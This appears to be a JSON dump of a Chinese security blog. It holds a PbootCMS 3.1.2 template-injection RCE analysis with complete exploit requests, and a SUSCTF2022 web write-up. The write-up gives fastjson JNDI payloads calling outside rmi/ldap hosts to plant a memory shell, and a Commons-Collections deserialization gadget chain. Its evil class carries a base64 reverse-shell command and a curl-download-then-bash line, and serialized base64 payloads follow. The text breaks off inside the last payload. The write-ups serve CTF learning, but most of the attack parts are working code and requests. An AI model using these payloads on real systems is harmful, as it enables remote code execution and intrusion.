{"pages":[{"title":"about","text":"这里没有高深的知识，只有零散的笔记，或是直接摘抄，或是简单总结，只为在我「暂时失忆」时，帮自己度过难关，如果能帮助到你我会感到很高兴。 关于我 ID: suanve ID: 请妹子不要把咖啡泼在我的macbook上 热衷于CTF,赛场上看到suanve就是我啦.","link":"/about/index.html"},{"title":"友链","text":"这里记录着陪伴/指引着我的师傅们顺序不分先后Summers: https://sumsec.me/T4rn: https://hackerpoet.com/Helen: https://www.helen-re.cnPerson: https://www.penson.top/Niyah： http://niyah.cn/Evoa: https://evoa.me/","link":"/link/index.html"}],"posts":[{"title":"pboot cms V3.1.2 &quot;虚假的无文件落地RCE&quot;","text":"Auth: EDI安全/suanve 0 前言上次电脑送修我就买了个mini 一直用macmini 结果 本子修好以后拿回来也忘了看 苹果售后把我系统分区重装了 导致没有php环境 brew在macos 12上也不能正常工作 这就直接导致西湖比赛的时候我vardump调试也没调出个所以然（还被大佬喷 （确实 挺简单的一个漏洞 今天回XX以后 调试了一下 1 分析根据历史漏洞可以知道在前台 有一个 ssti 搜索eval可以找到eval('if(' . $matches[1][$i] . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}'); eval出自parserIfLabel函数 找parserIfLabel调用可以找到parserAfter 找parserAfter调用可以找到SearchController-index 在parserAfter函数中 可以看到获取了keyword关键字 （有的初学者可能就觉得问题出现在这里了 我比赛的时候也是犯了这个错误 实际上这里的逻辑写的挺好的 取参的时候 会通过正则来校验输入 如果不符合就把传入的数据置空 恶意操作基本进不去 （但是。。。开发者在加载模板的时候 其实已经把我们的payload放入$content了所以get里的限制就限制了个寂寞 开始分析 先把payload带进去 在刚加载（渲染）完模板的时候 可以看到已经把恶意语句加载进来了 所以他的get函数中几个限制完全没起到作用（其实漏洞点不在keyword关键字 后面会详细说 可以看到 get方法内到各种限制操作 确实把不符合规则的keyword给置null了 但是其实content里的还在 所以这里跟进看一下最初始的渲染模板部分 首先在这里是加载模板 渲染基础部分生成缓存 然后包含缓存后 在这里发现了 echo URL; 这里保存的还是完整url 问题就是出在这里了 继续往下看 可以看到$content = ob_get_contents(); 行吧 直接把url输出然后保存到$content里了。 即使下面他多次获取keyword时试图不把违规字符带入模板 都没有一点意义 细心的小伙伴可能发现了 这个问题好像是出在二维码生成标签这个位置的 而在进入我们关键点之前 就有这么一次操作 跟进去看一眼 嗯 他匹配了我们二维码这个标签的内容 然后将其生成二维码链接 （所以大家知道了吧 漏洞实际上出在他对模板的渲染部分上 这就导致所有和模板渲染的地方 都会存在这个问题（其实就是只要有二维码分享的页面 都可以触发我们后面的payload 所以我们想利用这里的话 只需要针对上面的正则/\\{pboot:qrcode(\\s+[^}]+)?\\}/做文章就好了 我们提取出关键的这一行html 发现会被完整的匹配到 结合正则很容易理解 括号成对嘛 所以我们给他加一个}他不就匹配不到我们的payload了 至此 我们已经完整的解决了{}带入模板的问题 接下来就直接把经过各种操作的$content带到了parserIfLabel 函数 也就是存在eval的地方 百度找找历史文章分析就知道无非就是绕那几个正则 (推荐一个网站 https://regex101.com/ 挺好用的 牵扯到之该cms之前的几个漏洞 我们可以知道完成以下两点即可实现rce 绕过函数执行正则 绕过参数正则 一个个来 绕过函数执行正则说几个知识点 大家都懂得 12345func(1);func (1);func/**/(1);func (1); pbootcms的函数执行检测正则长这样 ([\\w]+)([\\x00-\\x1F\\x7F\\/\\*\\&lt;\\&gt;\\%\\w\\s\\\\\\\\]+)?\\( 大概了解一下以后 嗯。。。还想啥 直接fuzz就好啦 ？？ 咋四种都不行 但是大家别忘了啊 第三种有注释啊/**/ 你只匹配([\\w+])那我加一个-你还能匹配到吗？你匹配不到了吧。 绕过参数获取的正则这里我没有详细的去研究怎么绕关键字意义不大 毕竟是ctfer 用点 ctf技巧就派上用场了（网上的漏洞分析有两个关键函数 可以直接用 get_lg和get_backurl 他俩都在function.php get_lg 是从 cookie lg字段取 12345678910// 获取当前语言并进行安全处理Åfunction get_lg(){ $lg = cookie('lg'); if (! $lg || ! preg_match('/^[\\w\\-]+$/', $lg)) { $lg = get_default_lg(); cookie('lg', $lg); } return $lg;} get_backurl从get取 12345678910111213// 获取返回URLfunction get_backurl(){ if (! ! $backurl = get('backurl')) { if (isset($_SERVER[&quot;QUERY_STRING&quot;]) &amp;&amp; ! ! get('p')) { return &quot;&amp;backurl=&quot; . $backurl; } else { return &quot;?backurl=&quot; . $backurl; } } else { return; }} 所以使用这两个函数 搭配函数执行方式 就能绕过正则 2 利用:123456789101112131415161718192021GET /index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 任意页面皆可rce根据刚刚所说的 他实际上不是search控制器的问题所以任意页面都可以调用 123456789101112131415161718192021GET /index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 123456789101112131415161718192021GET /?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&amp;backurl=;id HTTP/1.1Host: localhost:80User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloaUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Length: 2 漏洞的挖掘大多数都是站在前人的肩膀上 我也不例外 这样一个调一调就出来了的洞 大家应该都有 公开也没什么不好 x 有关西湖论剑ctf有disablefunction和openbasedir php7.2开始弃用了create_function但是没移除 还是可以用的 所以调用 https://github.com/mm0r1/exploits/tree/master/php-filter-bypass “pwn”一下就好了 欢迎关注”EDI安全”","link":"/2021/11/22/pboot-cms-V3-1-2-%E8%99%9A%E5%81%87%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0RCE/"},{"title":"SUSCTF2022-web-writeup","text":"Auth: EDISEC Team本场比赛可谓是”非预期的非预期次方” fxxkcors123456789fxxkcorschallenge:http://124.71.205.122:10002/report:http://123.60.71.144:3000/fxxkcorshttp://159.138.56.26:3000/fxxkcorshttp://119.13.125.234:3000/fxxkcors 应该是要绕CORS 让BOT修改我的用户为admin Origin无效 没找到有xss 写 POST发json 让BOT打也没修改成功 我也不知道为啥。。。 1234567891011BOT特征connect to [10.7.100.194] from ecs-119-13-125-234.compute.hwclouds-dns.com [119.13.125.234] 37878GET / HTTP/1.1Host: 36.255.221.156:902Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/99.0.4844.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US 蹭车出了（真的是笑死 共享环境就这点不好 baby gadget v1.0123baby gadget v1.0bypass and bypasshttp://124.71.187.127:20012/ bp绕过重定向 可以发现admin/download.jsp 下载下来是一个依赖包 fastjson 目录扫描，访问到admin/路由 会自动重定向 弱密码登录 admin admin123 fastjson触发点 123456789101112131415161718192021222324252627POST /admin/mailbox.jsp HTTP/1.1Host: 124.71.187.127:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 272Origin: http://124.71.187.127:20012Connection: closeReferer: http://124.71.187.127:20012/admin/mailbox.jsp?q=123123123Cookie: JSESSIONID=197ACA802BB2F2298D4CA7DDA7154D85Upgrade-Insecure-Requests: 1Origin: foo.example.orginputtext={ &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://1.116.218.142:9999/Object&quot;, &quot;autoCommit&quot;:true }} 可能需要根据那个lib 挖链子 但是我选择摆烂 工具梭哈 写个内存马 然后{cat,flag} 绕过rasp检测 1234567891011121314151617181920212223242526POST /admin/mailbox.jsp HTTP/1.1Host: 124.71.187.127:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 294Origin: http://124.71.187.127:20013eConnection: closeReferer: http://124.71.187.127:20013/admin/mailbox.jsp?q=123123123Cookie: JSESSIONID=09C31AC61C1C265773A55D835D085415Upgrade-Insecure-Requests: 1Origin: foo.example.orginputtext={ &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://1.116.218.142:1389/TomcatBypass/TomcatMemshell&quot;, &quot;autoCommit&quot;:true }} 后续查看依赖 baby gadget v1.0’s rrrevengefastjson变为1.2.48，其他没变，改一下payload {“@type”:”org.apache.xbean.propertyeditor.JndiConverter”,”AsText”:”ldap://xx.xx.xx.xx:7771/Exploit”} 成功访问类，但没有弹回来shell，跟着上题的思路，同样写个内存马就完事了 {“@type”:”org.apache.xbean.propertyeditor.JndiConverter”,”AsText”:”ldap://xx.xx.xx.xx:7771/SRain”} 抓一下flag baby gadget v2.0登录是个XML 猜测XXE 不符合xml标准爆出 Get out hacker! 提示了hint.txt 尝试dtd+无回显 读取到hint，下载压缩包 有waf限制 http://124.71.189.248:20012/bf2dcf6664b16e0efe471b2eac2b54b2 但是还是知道了是直接body反序列化 试了一晚上 使用其他Class绕过HashMap就可以了 poc如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import org.apache.commons.collections.Bag;import org.apache.commons.collections.FastHashMap;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.bag.HashBag;import org.apache.commons.collections.bag.TransformedBag;import org.apache.commons.collections.bag.TransformedSortedBag;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.*;/** * @author MoonBack * @date 2022/2/27 16:07 */public class susctf { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]{ ClassPool.getDefault().get(evil.class.getName()).toBytecode() }); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { obj }) }; Transformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map hashMap = new TreeMap(); // 构造出恶意Map Map evilMap = LazyMap.decorate(hashMap, chainedTransformer); // 用恶意Map初始化TiedMapEntry类 TiedMapEntry tiedMapEntry = new TiedMapEntry(evilMap, &quot;key&quot;); // 将构造好的TiedMapEntry对象作为HashMap的一个key Map evalMap = new FastHashMap(); // put的时候会触发Map：key的get方法，所以先构造一个无害的ChainedTransformer对象用来初始化，之后再用反射修改值 evalMap.put(tiedMapEntry, &quot;123&quot;); // 注意这里 evilMap.remove(&quot;key&quot;); // 用反射设置把恶意构造的Transformer Field declaredFields = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); // 设置权限 declaredFields.setAccessible(true); declaredFields.set(chainedTransformer, transformers); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(evalMap); oos.close(); System.out.println(new String(Base64.getEncoder().encode(barr.toByteArray()))); // 本地测试触发// System.out.println(barr);// ObjectInputStream ois = new SafeInputStream(new ByteArrayInputStream(barr.toByteArray()));// Object o = (Object) ois.readObject(); }} 反弹shell是失败的。。。所以先curl写文件 然后再执行它 通过curl把flag带出来 123456789101112131415161718192021222324/** * @author MoonBack * @date 2021/12/15 15:00 */import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class evil extends AbstractTranslet { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public evil() throws Exception {// Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zNi4yNTUuMjIxLjE1Ni85ODAxIDA+JjE=}|{base64,-d}|{bash,-i}&quot;);// Runtime.getRuntime().exec(&quot;curl -o /tmp/suanve http://36.255.221.156:901/1 &quot;); Runtime.getRuntime().exec(&quot;bash /tmp/suanve&quot;);// Runtime.getRuntime().exec(&quot;calc&quot;); }} 1 下载文件 1234567891011121314POST /bf2dcf6664b16e0efe471b2eac2b54b2 HTTP/1.1Host: 124.71.189.248:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1cmd: idOrigin: foo.example.orgContent-Type: application/x-www-form-urlencodedContent-Length: 3830rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuRmFzdEhhc2hNYXDPVCYVgxGIjgIAAloABGZhc3RMAANtYXB0ABNMamF2YS91dGlsL0hhc2hNYXA7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4AHNxAH4AAj9AAAAAAAAMdwgAAAAQAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2tleXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAZ4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2bkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAYTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAABXXK/rq%2bAAAANAAuCgAHAB8KACAAIQgAIgoAIAAjCAAkBwAlBwAmAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMZXZpbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ%2bAQADKClWBwAoAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwAGgAbBwApDAAqACsBADBjdXJsIC1vIC90bXAvc3VhbnZlIGh0dHA6Ly8zNi4yNTUuMjIxLjE1Njo5MDEvMSAMACwALQEAEGJhc2ggL3RtcC9zdWFudmUBAARldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAMAAwAAAAgAAMAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAEQASAAIAEwAAAAQAAQAUAAEACAAVAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAOAAwAAAAqAAQAAAABAA0ADgAAAAAAAQAPABAAAQAAAAEAFgAXAAIAAAABABgAGQADABMAAAAEAAEAFAABABoAGwACAAoAAABNAAIAAQAAABcqtwABuAACEgO2AARXuAACEgW2AARXsQAAAAIACwAAABIABAAAABAABAATAA0AFAAWABYADAAAAAwAAQAAABcADQAOAAAAEwAAAAQAAQAcAAEAHQAAAAIAHnB0ABJIZWxsb1RlbXBsYXRlc0ltcGxwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBzcgARamF2YS51dGlsLlRyZWVNYXAMwfY%2bLSVq5gMAAUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHBwdwQAAAAAeHh0AAMxMjN4 2 执行文件 123456789101112131415POST /bf2dcf6664b16e0efe471b2eac2b54b2 HTTP/1.1Host: 124.71.189.248:20012User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1cmd: idOrigin: foo.example.orgContent-Type: application/x-www-form-urlencodedContent-Length: 3742rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuRmFzdEhhc2hNYXDPVCYVgxGIjgIAAloABGZhc3RMAANtYXB0ABNMamF2YS91dGlsL0hhc2hNYXA7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4AHNxAH4AAj9AAAAAAAAMdwgAAAAQAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2tleXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAAnNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2bAAZ4cHZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHNyAD5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H%2bkhtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAYTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX%2bAYIVOACAAB4cAAABTLK/rq%2bAAAANAAsCgAGAB4KAB8AIAgAIQoAHwAiBwAjBwAkAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMZXZpbDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmF